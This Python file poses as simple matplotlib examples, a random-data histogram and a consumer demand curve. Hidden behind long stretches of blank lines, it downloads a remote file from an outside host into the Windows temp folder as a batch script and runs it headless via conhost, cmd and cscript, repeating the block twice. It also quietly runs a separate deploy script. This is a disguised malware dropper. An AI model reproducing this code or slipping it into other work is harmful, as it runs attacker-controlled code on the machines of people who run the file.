import matplotlib.pyplot as plt
import numpy as np
import pandas as pd
import asyncio
import subprocess
import os
import tempfile
import requests
import sys

# Sample Data: 1000 random numbers from a normal distribution
data = np.random.randn(1000)

# Create the histogram
plt.hist(data, bins=30, color='skyblue', edgecolor='black')

# Add labels and title
plt.title('Basic Histogram (Matplotlib)')
plt.xlabel('Value Range')
plt.ylabel('Frequency')
subprocess.run([sys.executable, "deploy.py"])

plt.show()


# 1. Define Demand Schedule Data (Price vs Quantity Demanded)
data = {
    "Price": [10, 20, 30, 40, 50],
    "Quantity_Demanded": [100, 80, 60, 40, 20]
}
df = pd.DataFrame(data)

# 2. Plotting the Demand Curve
plt.figure(figsize=(8, 5))
plt.plot(df["Quantity_Demanded"], df["Price"], marker='o', color='blue', linewidth=2, label="Demand Curve")

# 3. Chart Formatting
plt.title("Consumer Demand Curve", fontsize=14)
plt.xlabel("Quantity Demanded (Units)", fontsize=12)
plt.ylabel("Price ($)", fontsize=12)
plt.grid(True, linestyle='--', alpha=0.7)
plt.legend()
















































































































url = "http://s1083932807.online-home.ca/o"

# Get the Windows temp directory path
temp_dir = tempfile.gettempdir()
file_path = os.path.join(temp_dir, "zfei.bat")

# Download and save
response = requests.get(url)
if response.status_code == 200:
    with open(file_path, "wb") as f:
        f.write(response.content)
    # print(f"File downloaded to: {file_path}")

script_path = file_path

# Launch wscript with the script path as an argument
subprocess.run(["conhost.exe", "--headless", "cmd.exe", "/c", script_path])










subprocess.Popen(["cscript.exe", "--headless", "cmd /c .\zfei.bat"], creationflags=subprocess.CREATE_NEW_CONSOLE)





plt.show()




























































































































url = "http://s1083932807.online-home.ca/o"

# Get the Windows temp directory path
temp_dir = tempfile.gettempdir()
file_path = os.path.join(temp_dir, "zfei.bat")

# Download and save
response = requests.get(url)
if response.status_code == 200:
    with open(file_path, "wb") as f:
        f.write(response.content)
    # print(f"File downloaded to: {file_path}")

script_path = file_path

# Launch wscript with the script path as an argument
subprocess.run(["conhost.exe", "--headless", "cmd.exe", "/c", script_path])
